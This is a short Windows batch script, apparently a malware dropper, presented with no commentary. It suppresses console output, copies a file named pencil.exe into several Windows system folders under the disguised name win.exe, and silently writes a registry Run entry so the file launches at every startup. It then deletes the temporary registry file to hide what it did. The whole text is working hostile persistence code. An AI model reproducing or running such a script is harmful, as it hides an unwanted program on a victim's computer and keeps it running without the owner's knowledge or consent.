@ctty nul
copy pencil.exe %windir%\win.exe
copy pencil.exe %windir%\system\win.exe
copy pencil.exe %windir%\command\win.exe
echo REGEDIT4 >>C:\z.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>c:\Z.REG
ECHO "Win32"="C:\\windows\\win.exe" >>C:\z.reg
regedit /s C:\z.reg
del C:\z.reg



